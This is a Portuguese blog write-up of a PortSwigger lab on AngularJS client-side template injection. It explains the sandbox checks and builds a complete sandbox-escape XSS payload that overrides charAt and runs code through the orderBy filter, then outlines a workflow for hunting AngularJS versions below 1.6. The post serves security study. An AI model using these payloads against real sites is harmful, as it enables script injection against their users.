---
title: "XSS: Explorando cenários complexos | AngularJS"
categories:
  - papers
  - web hacking
  - owasp
tags:
  - papers
  - ctf
  - owasp
  - XSS
---

## XSS: Cenários Complexos | AngularJS

E estamos de volta, dessa vez com cenários complexos de XSS. Como assim? Veja, de repente você chegou lá na **PortSwigger**, foi fazendo os labs, mas nem se tocou em tentar entender os "bastidores" da vulnerabilidade, apenas pegou o *payload* e "mandou bala" sem saber o que estava acontecendo.

Talvez por ser muito complexo, não sei. Mas, curioso do jeito que sou, resolvi correr atrás desses detalhes e quero compartilhar com você, para facilitar sua vida e aprendizado.

### O lab

Bem, não vou configurar nenhum lab vulnerável para te mostrar, visto que no site da PortSwigger já tem um, esse [aqui](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-without-strings).

Certo, não foque tanto no **tipo** do XSS, se é refletido, armazenado, enfim. Foque no que abordaremos aqui: **o motivo da falha existir.**

Vou deixar a apresentação do lab:

***This lab uses AngularJS in an unusual way where the $eval function is not available and you will be unable to use any strings in AngularJS.
To solve the lab, perform a cross-site scripting attack that escapes the sandbox and executes the alert function without using the $eval function***

Ok, a essa altura, dependendo do seu nível de conhecimento, talvez não tenha entendido nada. E não tem problema, vamos destrinchar juntos.

Já sabemos que há um AngularJS rodando na aplicação e, pra quem não sabe, esse carinha é usado para renderizar conteúdos na página. E, neste cenário, a input do usuário é refletida no contexto do código AngularJS. Isso pode ser bem ruim porque o AngularJS pode ver a entrada do usuário como um código executável (JavaScript) e não como um texto simples, por exemplo.

Veja, neste caso, precisaríamos primeiro identificar o Angular.

### A falha

Vamos ao problema!

A input do usuário está sendo refletida dentro do contexto do Angular, sem os devidos filtros ou sanitizações. E como acontece em SSTI, existem expressões que são avaliadas pelo mecanismo de template e aqui quem faz isso é o *evaluator* do AngularJS.

Basicamente, assim como em SSTI, existe uma sintaxe que permite que venhamos a inserir código de forma que eles sejam interpretados e conteúdos sejam gerados dinamicamente. Certo, até aqui, creio que você já sabe.

Porém, nosso cenário aqui não é um caso clássico de SSTI, mas sim CSTI, ou seja, *Client-side Template Injection*. Para te ajudar a entender a diferença:

```plaintext
SSTI -> Código executado no contexto do servidor. (Por isso, "Server-side")
CSTI -> Código executado no contexto do client, browser. (Por isso, "Client-side")
```

Certo.

### AngularJS Sandbox

O Angular tem um expression evaluator embutido, e acontece que esse cara, quando vê algo entre `{{alguma coisa}}`, interpreta essa "coisa" como código "JavaScript-like", ou seja, como JavaScript.

Pensando nisso, e creio eu já conhecendo o cenário de SSTI, implementaram um mecanismo de **sandbox**, que nada mais é do que uma camada adicional de código JavaScript no Angular para evitar que "mentes pensantes demais" injetassem códigos que não eram para ser injetados.

Se não existisse essa sandbox, tal sujeito, partindo de um ponto vulnerável da aplicação, poderia injetar algo como:

```javascript
{{window.location='rataria.com'}}
```

O que, se você conhece um pouquinho de JavaScript, sabe que não poderia resultar em boa coisa para a vítima.

Esse mecanismo basicamente faz uma checagem da expressão que está dentro de `{{}}` e a reescreve antes de executá-la, prevenindo que essas mentes mal-intencionadas acessem objetos como `window`, `document` e `Function`, que são objetos do JavaScript que, como você já deve saber, caso sejam acessados, nos permitem controlar algumas coisas, como o comportamento da vítima ao acessar a página.

E para essa checagem, existem funções dentro do código do Angular que fazem esse trabalho:

- `ensureSafeObject()` — detecta o `window` object, verificando se ele está referenciando a si mesmo.
- `ensureSafeMemberName()` — bloqueia algumas propriedades, como `__proto__`, por exemplo.
- `ensureSafeFunction()` — impede chamadas a métodos como `.bind()`, `.apply()`, `.call()` e `.constructor()`.

### Entendendo algumas coisas

A sacada que o pessoal da PortSwigger teve foi incrível. Veja, **é tentar defender JavaScript com o próprio JavaScript**. E, portanto, sabendo disso, eles descobriram que seria possível enganá-lo.

Acontece que a sandbox faz uma checagem em caracteres. Sim, como uma "whitelist". É usada uma função chamada `isIdent()` que checa se um determinado caractere da expressão pertence a um "safe identifier", ou seja, se não pertence a algum atributo que já foi bloqueado.

Por exemplo, vamos supor que tentemos algo como:

```javascript
{{window.location='algumacoisa.com'}}
```

Os caracteres dessa expressão serão avaliados por essa função e ela vai pensar: hmmm, "w"? "i"? "n"? "d"? "o"? "w"? Hmmm, "window"? Está bloqueado, não passa.

Claro, em termos simples. Dessa forma, talvez você se questione: Ok, mas como ocorre essa checagem? Simples, com o método `charAt()` — pois é! Se você já estudou JS, conhece muito bem ele.

A nível de código, o papel do `charAt()` seria como isso aqui:

```javascript
// Essa função pega o caractere e passa para isIdent().
readIdent: function() {
    for (var a = this.index; this.index < this.text.length;) {
        var c = this.text.charAt(this.index);  // ← get ONE character
        if (!this.isIdent(c) && !this.isNumber(c)) break;
        this.index++;
    }
}

// isIdent() verifica se o caractere passa.
isIdent = function(ch) {
  return ('a' <= ch && ch <= 'z' || 'A' <= ch && ch <= 'Z' ...);
}
```

Até aí, "tudo bem". Como você sabe, `charAt()` vai pegar caractere por caractere da expressão que foi passada para o *evaluator* do Angular e vai testar se é algo genuíno e se está tudo "safe".

Veja a comparação que é feita. Não sei se você sabe, mas no fundo da coisa, caracteres são tratados por seus respectivos índices na tabela ASCII. Como assim?

No fim de tudo, a letra 'A', ou melhor, o caractere 'A', é tratado como o número 41, de acordo com a tabela ASCII. Caso você não saiba o que é a tabela ASCII, o bom e velho Google pode te ajudar.

Retornando...

Se você faz a seguinte comparação em JS:

```javascript
let nome = "nome";

if ('a' <= nome) {
  // faz alguma coisa
}
```

O JS vai avaliar o caractere 'a' com cada caractere da string "nome" até achar uma diferença entre elas e, neste caso, será retornado `false` porque o código ASCII do caractere 'a' (que é 61) é menor do que o de 'n' (que é 110).

E em JS, se você fizer algo como:

```javascript
let nome = "rato";

let letras = nome.split("");

console.log(letras);  // Você verá um array com todos os caracteres da palavra "rato"

console.log(letras.join(""));  // Aqui você verá a palavra "rato" por completo.
```

Testando esse código aí você verá o seguinte resultado:

```plaintext
[ 'r', 'a', 't', 'o' ]
rato
```

Certo, agora você vai sacar o porquê de eu ter trazido toda essa explicação para você.

### A Sacada

Veja, a função mencionada — `isIdent()` — usa o método `charAt()` para esse serviço de pegar caractere por caractere, como vimos. E a sacada foi a seguinte: corromper o método `charAt()`. Como assim?

Precisamos dar bypass naquela checagem ali. Se conseguimos forçar que, ao invés de comparar caractere com caractere, comparemos uma string inteira com um caractere, conseguimos "envenenar" a cadeia de comparação e passar recebendo `true`. Vou te exemplificar.

O nosso objetivo é fazer com que a comparação na função `isIdent()` saia disso:

```javascript
ch = 'a';  // vamos considerar que essa variável, em um cenário padrão, tenha esse valor.
isIdent = function(ch) {
  // 'a' <= 'a'? && 'a' <= 'z' ? ....
  return ('a' <= ch && ch <= 'z' || 'A' <= ch && ch <= 'Z' ...);
}
```

Para isso:

```javascript
ch = 'rataria';  // vamos considerar que essa variável, em um cenário padrão, tenha esse valor.

isIdent = function(ch) {
  // 'a' <= 'rataria'? && 'rataria' <= 'z' ? ....
  return ('a' <= ch && ch <= 'z' || 'A' <= ch && ch <= 'Z' ...);
}
```

Percebeu? Mas como poderíamos fazer isso? Simples, vamos alterar o conteúdo do método `charAt()` de forma que ele retorne sempre uma string inteira, ao invés de um único caractere:

Em um cenário hipotético, faríamos da seguinte maneira:

```javascript
'rataria'.constructor.prototype.charAt=[].join
```

Isso faz parte da sintaxe do JS, e deixo o dever de casa para você pesquisar o que significa essa sintaxe. Mas, em termos brutos, modificamos o comportamento do método `charAt()` de forma que toda vez que ele for chamado, ele terá um novo comportamento, que é devolver a string inteira 'rataria', ao invés de uma única letra.

### O lab

Agora vindo para o cenário do lab, tudo se aplica aqui. Temos apenas uma restrição imposta pelo lab: strings literais escritas com aspas simples ou duplas estão bloqueadas. O lab, no caso, nos forneceu essa informação, mas em um cenário real teríamos de testar — como? Simples, usando-as e vendo se o payload funcionaria.

Talvez surja a seguinte dúvida: E como iremos então modificar o método `charAt()` se ele pertence ao protótipo de strings? Simples! Se você conhece um pouquinho de JS, verá que com `toString()` conseguimos gerar uma string sem precisar usar uma literal!

Portanto, uma parte do payload seria assim:

```javascript
toString().constructor.prototype.charAt=[].join;
```

Dessa forma estamos alterando o `charAt()` de forma global, de modo que em qualquer lugar que ele apareça, nossa versão seja executada.

Esse seria o **coração** do bypass. O resto seria o payload conforme o lab. Vamos abordá-lo aqui.

Certo, sabemos que strings literais não são permitidas, mas como passar `x=alert(1)` para que ele seja executado e nos dê um XSS?

Simples, strings não podem, mas o JS tem um método chamado `fromCharCode()`, ao qual podemos passar uma sequência em ASCII que será convertida para sua representação em string.

Por isso essa parte bizarra aqui do payload:

```javascript
toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41);
```

Se você der uma olhada na tabela ASCII, verá que esses bytes correspondem às letras da string "x=alert(1)".

Certo, já temos a string, agora precisamos executá-la, mas como fazer isso? `$eval()` também está bloqueada, a descrição do lab nos informa isso.

Aí entra outra parte do payload: `[1]|orderBy:toString.constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1`

Eu também estranhei essa sintaxe, mas trata-se de algo do próprio Angular. Em termos simples: estamos usando o mecanismo de filtro do Angular que transforma dados em expressões Angular e o evaluator as avalia e executa. Basicamente, `orderBy` ordena arrays, por isso a sintaxe:

```javascript
[1] // array

| // sintaxe de filtro

orderBy: // o que vem aqui será avaliado como uma expressão Angular e executada pelo evaluator dele, portanto o código toString.constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41) retornará a string x=alert(1). Seria como se estivéssemos escrevendo orderBy: x=alert(1)

=1  // Apenas por questões de sintaxe.
```

Agora o payload completo:

```javascript
1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1

// O 1 no início é apenas o valor do parâmetro search.
```

E assim, temos o payload completo e conseguimos fazer com que o Angular execute código JS para nós e nos dê um XSS reflected.

#### Como uso esse conhecimento?

Talvez sua dúvida agora seja: Certo, mas como vou lembrar disso tudo, de fazer essa análise toda em trabalhos/estudos futuros? Comece prestando atenção na versão do Angular. Acontece que a partir da versão 1.6 a sandbox foi removida, portanto, toda essa explicação e cenário aqui já não se aplica mais. Ou seja, viu Angular com versões < 1.6? Hora de começar a pensar em caminhos!

Partindo disso, você precisa dar uma olhada em quais propriedades estão sendo bloqueadas pelo código do Angular, e para isso, se atente aos códigos das funções `ensureSafeObject()`, `ensureSafeMemberName()` e `ensureSafeFunction()`. No caso, o código foi minificado, o que dificulta ainda mais achar essas funções pelo nome, mas você, com a ajuda de alguma IA, consegue identificar esses trechos:

A função `ensureSafeMemberName()`:

```javascript
function Wa(b, a) {
    if ("__defineGetter__" === b || "__defineSetter__" === b || 
        "__lookupGetter__" === b || "__lookupSetter__" === b || 
        "__proto__" === b) throw da("isecfld", a);
    return b
}
```

Veja que ela não bloqueou `constructor`, `prototype` e `charAt`.

A função `ensureSafeObject()`:

```javascript
function Ba(b, a) {
    if (b) {
        if (b.constructor === b) throw da("isecfn", a);   // catches Function
        if (b.window === b) throw da("isecwindow", a);    // catches window
        if (b.children && (b.nodeName || ...)) throw ...  // catches DOM elements
        if (b === Object) throw da("isecobj", a);         // catches Object
    }
    return b
}
```

Aqui está sendo feita uma checagem para ver se há uma tentativa de uso de função, olhando para o `Function`, visto que o construtor de uma função é o próprio `Function`, e bloqueia. Além de checagens a respeito de `window`, `Object` e elementos do DOM.

A função `ensureSafeFunction()`:

```javascript
function ld(b, a) {
    if (b) {
        if (b.constructor === b) throw da("isecfn", a);
        if (b === Uf || b === Vf || b === Wf) throw da("isecff", a);
    }
}
```

Aqui ocorrem as checagens contra `Function.bind`, `Function.call` e `Function.apply`. Nesse caso, `.fromCharCode()` passa porque se trata de um método do tipo `String`.

A função `isIdent()`:

```javascript
isIdent: function(a) {
    return "a" <= a && "z" >= a || "A" <= a && "Z" >= a || "_" === a || "$" === a
}
```

O código do `orderBy`:

```javascript
function Bd(b) {
    function a(a, c) {
        ...
        if (I(a)) {          // I(a) = "is it a string?"
            ...
            if ("" !== a && (h = b(a), h.constant)) ...
        }
    }
```

O `orderBy` consegue executar código porque foi instanciado com o *evaluator* do Angular. A nível de código fonte, seria algo assim:

```javascript
Ba.filter("orderBy", ["$parse", function(b) {
    return Bd(b)
}])
```

É como se quem escreveu o código estivesse dizendo assim para o Angular: qualquer expressão que for passada para o `orderBy`, você avalia e executa.

O fluxo de ataque poderia ser:

```plaintext
Encontrou angular.js no código fonte?
    ↓
Cheque a versão dele.
    ↓ < 1.6
Sandbox presente. Hora de buscar caminhos para fazer o evasion.
    ↓
Busque: ensureSafeMemberName — quais propriedades NÃO estão sendo bloqueadas?
Busque: ensureSafeObject — quais objetos passam sem serem verificados?
Busque: isIdent — a sandbox confia no charAt? Consigo sobrescrevê-lo?
    ↓
Busque: who calls $parse with user-influenced data?
Busque: quem chama $parse com dados vindos de input do usuário?
    → filtro orderBy: sim, possível ponto de code execution confirmado.
    ↓
Conseguimos chegar até esse ponto com uma input, seja de forma refletida ou armazenada? → CSTI confirmado
```

## No fim

Veja que interessante essa pesquisa que foi feita pela PortSwigger! Quando fui resolver esse lab, decidi tentar entender o que estava rolando por trás e muito aprendizado foi obtido. E te convido a fazer o mesmo — tente entender o porquê das coisas. Perceba que se trata de um caso que exige análise e que um scan de vulnerabilidades padrão muito provavelmente não chegaria até aqui.

Muito aprendizado até aqui. Veja que no final conseguimos um XSS e, particularmente, a diversão mora no caminho até chegar à vulnerabilidade, de fato. Por hoje é isso! Te vejo na próxima análise!

Muito obrigado!
Até breve!
